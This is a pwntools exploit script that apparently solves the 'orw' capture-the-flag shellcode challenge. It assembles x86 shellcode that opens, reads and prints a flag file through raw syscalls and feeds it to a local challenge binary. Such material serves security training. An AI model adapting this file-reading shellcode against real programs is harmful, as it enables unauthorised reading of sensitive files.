from pwn import *


shell_code = asm('\n'.join([
    'push %d' % u32('.txt'),
    'push %d' % u32('flag'),
    'push %d' % u32('ode/'),
    'push %d' % u32('ellc'),
    'push %d' % u32('y_sh'),
    'push %d' % u32('1bab'),
    'push %d' % u32('ft/1'),
    'push %d' % u32('ecso'),
    'push %d' % u32('st/s'),
    'push %d' % u32('t/te'),
    'push %d' % u32('/roo'), # Flag path
    'mov edx, 0', # Mode
    'mov ecx, 0', # Open syscall flag
    'mov ebx, esp', # Buffer
    'mov eax, 5', # Open syscall number
    'int 0x80',

    'mov edx, 352', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, eax', # fd
    'mov eax, 3', # Read syscall number
    'int 0x80',

    'mov edx, eax', # Count
    'mov ecx, esp', # Buffer
    'mov ebx, 0', # fd
    'mov eax, 4', # Write syscall number
    'int 0x80',
]))


conn = process('./orw')

log.info('Pwning start')
conn.recvuntil("Give my your shellcode:")
conn.sendline(shell_code)
conn.recvall()
